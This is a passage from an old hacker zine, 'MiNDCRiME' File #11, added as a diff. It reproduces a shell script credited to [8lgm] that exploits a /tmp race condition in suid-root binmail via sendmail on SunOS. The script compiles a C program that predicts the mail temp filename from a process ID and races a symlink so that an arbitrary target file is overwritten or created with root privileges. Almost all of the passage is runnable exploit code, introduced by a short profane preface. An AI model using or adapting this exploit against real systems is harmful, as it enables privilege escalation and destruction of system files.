@@ -1,0 +1,94 @@
+================================[MiNDCRiME]================================
+[ File #11:]
+
+
+[ I was told this was *thee* absolute latest sendmail script. If I am wrong,
+  spank me, cuz not only do I not give a flying fuck, but there are so many
+  sendmail exploits, it makes my head spin and I do not even try to keep
+  up with all of them. -hC ]
+
+#!/bin/sh
+# tmpmail: overwrite files using binmail
+#
+# Usage: tmpmail to-file
+#
+# [8lgm], tested under SunOS 4.1.2.
+#
+# Definitely NOT for distribution, please do not use for cracking purposes!
+# This script is only to be provided to trusted users, due to poor
+# workaround chances.
+#
+# Note: Script only works if mail is suid root.
+#       Other vendors may use tmpnam("ma").
+#
+# This vulnerability can be exploited for sgid
+# mail binmails, the only modification would
+# be to predict the pid of the mail process
+# created by sendmail.  This would be 4 forward
+# of the current pid - assuming a 'quiet' system.
+#
+# Will create to-file, or truncate.
+ 
+PATH=/usr/ucb:/usr/bin:/bin      export PATH
+IFS=" "                          export IFS
+ 
+PROG="`basename $0`"
+ 
+# Check args
+if [ $# -ne 1 ]; then
+        echo "Syntax: $PROG to-file"
+        exit 1
+fi
+ 
+TO_FILE="$1"
+ 
+ 
+# Create our racing program!
+ 
+cat > mailrace.c << 'EOF'
+#include <stdio.h>
+#include <unistd.h>
+ 
+char path[] = "/tmp/maaXXXX";
+ 
+main(argc,argv)
+int argc;
+char **argv;
+{
+  int pid;
+  char *trv;
+ 
+  if (argc != 3) {
+    fprintf(stderr, "Usage: %s pid tofile\n", argv[0]);
+    exit(1);
+  }
+ 
+  pid = atoi(argv[1]);
+ 
+/* Stolen from mktemp.c */
+  for (trv = path; *trv; ++trv);          /* extra X's get set to 0's */
+  while (*--trv == 'X') {
+    *trv = (pid % 10) + '0';
+    pid /= 10;
+  }
+ 
+  symlink("/tmp/ShortSong", path);
+  while(symlink(argv[2], path));
+  unlink("/tmp/ShortSong");
+  exit(0);
+}
+EOF
+cc -o mailrace mailrace.c
+ 
+# Check we now have mailrace
+if [ ! -x "mailrace" ]; then
+        echo "$PROG: couldnt compile mailrace.c - check it out"
+        exit 1
+fi
+ 
+# create some input for binmail
+echo localhost $USER > /tmp/BlueRoom.$$
+./mailrace $$ $TO_FILE &
+exec /bin/mail -d $LOGNAME < /tmp/BlueRoom.$$
+
+================================[MiNDCRiME]================================
